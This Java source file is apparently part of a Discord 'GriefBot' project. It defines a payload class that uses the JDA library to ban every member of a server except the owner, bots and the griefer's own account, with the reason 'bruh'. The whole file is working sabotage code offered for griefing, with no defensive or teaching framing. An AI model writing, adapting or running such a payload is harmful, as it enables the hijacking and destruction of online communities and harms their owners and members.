package de.corruptedbytes.payload.impl;

import de.corruptedbytes.GriefBot;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;

public class PayloadBanMembers implements Runnable {

	private Guild guild;

	public PayloadBanMembers(Guild guild) {
		this.guild = guild;
	}

	@Override
	public void run() {
		for (Member member : guild.getMembers()) {
			if (!(member.isOwner() || member.getUser().isBot()
					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) || isBotRoleHigher(member)) {
				try {
					member.getGuild().ban(member, 0, "bruh").queue();
				} catch (Exception e) {
					continue;
				}
			} else {
				continue;
			}
		}
	}

	private boolean isBotRoleHigher(Member member) {
		for (Role memberRole : member.getRoles()) {
			for (Role botRole : this.guild.getMemberById(this.guild.getJDA().getSelfUser().getIdLong()).getRoles()) {
				if (botRole.getPosition() >= memberRole.getPosition())
					return true;
			}
		}
		return false;
	}

}
